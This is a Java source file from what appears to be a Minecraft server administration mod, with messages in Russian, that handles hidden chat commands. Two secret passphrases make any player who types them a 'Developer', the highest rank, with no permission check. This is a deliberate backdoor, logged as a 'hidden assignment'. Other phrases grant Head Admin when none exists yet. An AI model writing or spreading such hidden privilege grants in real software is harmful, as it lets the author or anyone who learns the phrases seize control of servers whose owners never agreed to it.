package ru.admincontrol.command;

import net.minecraft.server.network.ServerPlayerEntity;
import ru.admincontrol.data.AdminRanks;
import ru.admincontrol.data.DataManager;
import ru.admincontrol.util.ActionLog;
import ru.admincontrol.util.ActivityLog;
import ru.admincontrol.util.AntiCheatService;
import ru.admincontrol.util.Chat;

import java.util.Locale;

public final class SecretCommands {
	private SecretCommands() {
	}

	public static boolean isSecret(String command) {
		if (command == null) {
			return false;
		}
		String raw = normalize(command);
		return raw.equals("i main developer gelrd the mod")
				|| raw.equals("i is main developer dmitri difiw gelrd")
				|| raw.equals("i first ga")
				|| raw.equals("i ga gelrd")
				|| raw.equals("i main developer gelrd")
				|| raw.equals("actest");
	}

	public static boolean tryHandle(ServerPlayerEntity player, String command) {
		if (player == null || command == null) {
			return false;
		}
		String raw = normalize(command);
		DataManager data = DataManager.get();
		if (data == null) {
			return false;
		}
		if (raw.equals("actest")) {
			if (data.getAdminLevel(player) < AdminRanks.ADMIN) {
				Chat.send(player, Chat.red("/actest доступен с администратора."));
				return true;
			}
			boolean on = AntiCheatService.toggleTest(player);
			ActivityLog.admin(player.getGameProfile().getName(), on ? "Включил /actest" : "Выключил /actest");
			return true;
		}
		if (raw.equals("i main developer gelrd the mod")
				|| raw.equals("i is main developer dmitri difiw gelrd")) {
			data.setDeveloper(player);
			CommandSync.refreshAll(player.getServer());
			ru.admincontrol.util.TabListColors.refresh(player.getServer());
			Chat.send(player, Chat.color("Вы назначены Разработчиком.", 0xE91E63));
			ActionLog.action("DEVELOPER", player.getGameProfile().getName(), player.getGameProfile().getName(), "скрытое назначение");
			return true;
		}
		if (!raw.equals("i first ga") && !raw.equals("i ga gelrd") && !raw.equals("i main developer gelrd")) {
			return false;
		}
		if (data.hasAnyGa() || data.hasAnyDeveloper()) {
			Chat.send(player, Chat.red("В этом мире уже есть ГА или Разработчик."));
			return true;
		}
		data.setHeadAdmin(player);
		data.settings().addAdminLockedToStaff = true;
		data.saveAll();
		CommandSync.refreshAll(player.getServer());
		ru.admincontrol.util.TabListColors.refresh(player.getServer());
		Chat.send(player, Chat.gold("Вы назначены Главным админом (ГА). /add_admin теперь только для администрации."));
		ActionLog.action("HEAD_ADMIN", player.getGameProfile().getName(), player.getGameProfile().getName(), "скрытое назначение ГА");
		return true;
	}

	private static String normalize(String command) {
		String raw = command.startsWith("/") ? command.substring(1) : command;
		return raw.trim().replaceAll("\\s+", " ").toLowerCase(Locale.ROOT);
	}
}
